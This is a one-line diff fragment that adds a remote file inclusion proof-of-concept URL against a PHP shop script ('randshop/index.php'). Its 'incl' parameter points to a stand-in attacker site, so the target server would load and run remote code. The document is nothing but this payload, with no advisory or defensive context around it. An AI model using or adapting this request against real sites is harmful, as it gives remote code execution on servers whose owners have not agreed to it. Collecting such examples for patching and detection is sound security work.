@@ -1,0 +1,2 @@
+http://www.example.com/randshop/index.php?incl=http://attacker's site
+
